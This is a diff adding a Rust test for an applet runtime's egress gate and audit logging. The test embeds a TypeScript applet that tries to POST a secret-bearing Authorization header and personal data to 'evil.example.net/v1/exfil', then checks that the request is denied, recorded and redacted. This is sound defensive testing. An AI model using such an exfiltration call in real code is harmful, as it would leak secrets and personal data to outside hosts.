@@ -494,6 +494,120 @@ fn secret_use_persists_redacted_audit_row_through_live_run() {
     }
 }
 
+/// An applet whose `ctx.net.fetch` targets a host the manifest does NOT allowlist,
+/// while carrying a `secret_ref` Authorization header. The SC-5 egress gate DENIES
+/// the request before it reaches the client (host mismatch), and the SC-13 secret is
+/// NEVER resolved. The applet catches the error so the run still completes — what
+/// matters is the recorded denial in the trace, not the run's success.
+const DENIED_EGRESS_TS: &str = r#"
+    export async function main(ctx: any, input: any): Promise<any> {
+        try {
+            await ctx.net.fetch({
+                method: "POST",
+                url: "https://evil.example.net/v1/exfil",
+                contentType: "application/json",
+                headers: { "Authorization": { secret_ref: "secret_crm" } },
+                body: JSON.stringify({ name: "Ada", email: "ada@example.com" })
+            });
+            return { ok: true, value: { sent: true } };
+        } catch (e) {
+            return { ok: true, value: { sent: false } };
+        }
+    }
+"#;
+
+#[test]
+fn denied_egress_persists_deny_row_and_no_allow_rows_through_live_run() {
+    // Review 151 (deny classification): a `ctx.net.fetch` the SC-5 egress policy
+    // DENIES is recorded as `{"denied": <CoreError>}` — it never reached the network
+    // and was never approved. The live `persist_run_egress_audit` must therefore:
+    //   * emit NO `allow` `network.egress` row,
+    //   * emit NO `allow` `secret.use` row (even though the request carried a
+    //     `secret_ref` Authorization header — no secret was resolved),
+    //   * emit a SINGLE `network.egress` `deny` row carrying the denial reason.
+    // A forbidden egress with a secret header must be auditable AS a denial, never
+    // persisted as an approval.
+    let mut core = WorkspaceCore::in_memory("ws-egress-deny").unwrap();
+    // A client that would PANIC the test if it were ever reached — the denial must
+    // short-circuit before the bridge, so this canned response is never served.
+    let response = NetResponse {
+        status: 200,
+        body: Some(r#"{"ok":true}"#.to_string()),
+        content_type: Some("application/json".to_string()),
+        ..Default::default()
+    };
+    core.set_http_client_factory(move || Box::new(CannedClient { response: response.clone() }));
+    core.set_secret_store_factory(|| {
+        Box::new(InMemorySecretStore::from_pairs([("secret_crm", "Bearer super-secret-token")]))
+    });
+
+    // The manifest allowlists ONLY api.example.com; the applet fetches evil.example.net.
+    let install = core.handle(owner_cmd(
+        "applet.install",
+        "app.crm",
+        json!({ "manifest": egress_manifest(), "sources": { "src/main.ts": DENIED_EGRESS_TS } }),
+    ));
+    assert!(install.ok, "install must succeed: {:?}", install.error);
+    let run = core.handle(owner_cmd("runtime.run", "app.crm", json!({ "input": {} })));
+    assert!(run.ok, "run completes (the applet caught the denial): {:?}", run.error);
+
+    // NO allow network.egress row was written for the denied fetch.
+    let allow_egress = core
+        .store()
+        .query_audit(&AuditQuery::by_action("network.egress"))
+        .unwrap()
+        .into_iter()
+        .filter(|r| r.decision == "allow")
+        .count();
+    assert_eq!(allow_egress, 0, "a denied fetch must NOT mint an allow network.egress row");
+
+    // NO secret.use row at all — the secret was never resolved on a denied fetch.
+    let secret_rows = core
+        .store()
+        .query_audit(&AuditQuery::by_action("secret.use"))
+        .unwrap();
+    assert!(
+        secret_rows.is_empty(),
+        "a denied fetch must NOT mint a secret.use row: {secret_rows:?}"
+    );
+
+    // Exactly ONE network.egress DENY row, carrying the denial reason + safe metadata.
+    let deny_rows = core
+        .store()
+        .query_audit(&AuditQuery::by_decision("deny"))
+        .unwrap();
+    assert_eq!(deny_rows.len(), 1, "exactly one persisted deny row: {deny_rows:?}");
+    let row = &deny_rows[0];
+    assert_eq!(row.producer, "net");
+    assert_eq!(row.action, "network.egress");
+    assert_eq!(row.decision, "deny");
+    assert_eq!(row.actor_id, "actor-owner-1");
+    assert_eq!(row.resource_type, "network");
+    assert_eq!(row.resource_id.as_deref(), Some("https://evil.example.net"));
+    // The reason names the denial; metadata carries method/host/path but NO status
+    // (the fetch never returned) and NO body.
+    assert!(
+        row.reason.to_lowercase().contains("denied") || row.reason.contains("PermissionDenied"),
+        "the deny row carries the denial reason: {}",
+        row.reason
+    );
+    let meta = row.metadata.as_object().unwrap();
+    assert_eq!(meta.get("method").unwrap(), "POST");
+    assert_eq!(meta.get("host").unwrap(), "evil.example.net");
+    assert!(!meta.contains_key("status"), "a denied fetch has no served status");
+
+    // REDACTION: neither the secret value nor the request body PII appears in ANY row.
+    let all = core.store().query_audit(&AuditQuery::default()).unwrap();
+    let raw: String = all
+        .iter()
+        .map(|r| format!("{}\n{}", r.reason, serde_json::to_string(&r.metadata).unwrap()))
+        .collect::<Vec<_>>()
+        .join("\n");
+    for leak in ["super-secret-token", "Ada", "ada@example.com"] {
+        assert!(!raw.contains(leak), "a denied-egress audit row leaks {leak}: {raw}");
+    }
+}
+
 #[test]
 fn lifecycle_purge_persists_queryable_audit_row_through_live_uninstall() {
     // A REAL `applet.uninstall` with `purge_data` lands a durable `applet.uninstalled`
